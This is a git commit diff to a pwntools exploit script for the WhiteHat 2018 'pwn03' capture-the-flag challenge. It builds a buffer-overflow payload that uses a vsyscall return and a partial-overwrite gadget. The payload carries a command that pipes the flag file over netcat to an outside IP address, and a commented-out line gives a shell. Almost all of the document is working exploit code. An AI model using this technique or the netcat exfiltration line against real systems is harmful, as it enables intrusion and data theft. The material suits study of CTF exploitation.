17931c71aad5b9a9db3a4681e2390c7c4d76e394
0x01f <aboultraman@gmail.com>
2018-08-25 15:08:28 +0800

    ret2vsyscall; reverse shell; special gadget

--- WhiteHat2018_pwn03/solve.py
+++ WhiteHat2018_pwn03/solve.py
@@ -9,6 +9,7 @@ context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 io = process("./onehit", env = {"LD_PRELOAD": "./libc-2.27.so"})
+#  io = remote("localhost", 9999)
 
 def DEBUG(bps = []):
     cmd = "set follow-fork-mode parent\n"
@@ -30,20 +31,23 @@ def get_interger():
         log.error("Not Found!!!")
 
 if __name__ == "__main__":
-    io.sendlineafter(" = ", str(get_interger()))
-    io.sendlineafter("al?\n", "yes")
-    DEBUG([0xEA0, 0xF13])
-    io.sendlineafter("sh\n", "1")
+    io.sendafter(" = ", str(get_interger()).ljust(0x100, '\x11'))
+    io.sendafter("al?\n", "N0\0")
+    #  DEBUG([0xEA0, 0xE7F])
+    io.sendafter("/bin/sh\n", "1\0")
 
     '''
     .text:000000000004F43A                 add     rdi, 7Fh
     .text:000000000004F43E                 jmp     short loc_4F45B
     '''
     vsyscall = 0xffffffffff600000
-    #  cmd = "cat flag| nc 58.87.66.225 9999\0"
-    cmd = ";/bin/sh <&2 >&2\0"
-    payload = cyclic(0xE0 + 8 - 145) + cmd 
-    payload = payload.ljust(0xE0 + 8, '\0') + p64(vsyscall) * 30 + "aaa"
+    cmd = "cat flag| nc 123.207.141.87 9999 ;"
+    #  cmd = "/bin/sh <&2 >&2\0"
+    payload = '\0' * (0x7f + 0x10) + cmd 
+    payload = payload.ljust(0xE0 + 8, '\0') + p64(vsyscall) * 20 + '\x3a'
+
     io.sendafter("available\n", payload)
+    #  pause()
 
     io.interactive()
+    io.close()
